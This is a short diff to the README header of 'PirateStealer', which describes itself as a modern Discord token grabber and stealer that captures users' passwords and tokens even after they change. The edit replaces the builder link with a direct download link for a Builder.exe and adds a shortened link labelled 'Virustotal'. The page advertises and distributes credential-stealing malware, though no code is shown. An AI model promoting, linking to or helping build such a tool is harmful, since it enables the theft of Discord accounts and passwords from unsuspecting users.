@@ -1,4 +1,4 @@
-##### [🔧 Builder](https://github.com/Stanley-GF/Arizona) - [💡 Features](https://github.com/Stanly-GF/PirateStealer-Builder#features)
+##### [🔧 Builder](https://github.com/Stanly-GF/PirateStealer-Builder/releases/download/PirateStealer-Builder/Builder.exe) - [💡 Features](https://github.com/Stanly-GF/PirateStealer-Builder#features) - [🛑 Virustotal](https://bit.ly/piratevirustotal)
 
 # PirateStealer
 The new modern discord token grabber & token stealer, with discord password & token even when it changes
